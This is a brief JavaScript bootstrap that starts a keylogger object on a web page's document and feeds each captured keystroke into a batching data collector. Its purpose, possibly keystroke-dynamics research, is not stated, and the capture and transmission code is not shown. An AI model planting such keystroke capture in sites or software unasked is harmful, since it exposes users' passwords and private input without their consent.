(function() {
  var data = new Kss.Data(Kss.BATCH_SIZE);
  var keylogger = new Kss.Keylogger(document);
  keylogger.attachListener(data.keystrokeHandler);
  data.start();
  keylogger.start();
})();
